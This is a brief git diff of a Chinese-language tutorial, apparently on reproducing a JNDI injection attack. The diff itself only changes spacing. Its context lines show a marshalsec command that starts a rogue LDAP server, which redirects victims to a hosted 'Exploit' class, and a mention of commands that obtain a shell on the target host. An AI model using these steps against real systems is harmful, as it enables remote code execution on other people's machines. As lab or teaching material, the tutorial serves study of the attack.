@@ -70,7 +70,7 @@ ps:cmd2是一个调用shell的语句；cmd3是一个直接获取目标主机 she
 ![web 服务](https://gitee.com/haigeek/picture/raw/master/uPic/dzstrp.png)
 
 3、开启一个 ldap 服务
-使用 ldap 服务快速开启工具(开源工具：https://github.com/mbechler/marshalsec)开启一个Ldap 服务
+使用 ldap 服务快速开启工具 (开源工具：https://github.com/mbechler/marshalsec) 开启一个Ldap 服务
 开启命令：
 ```
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/#Exploit
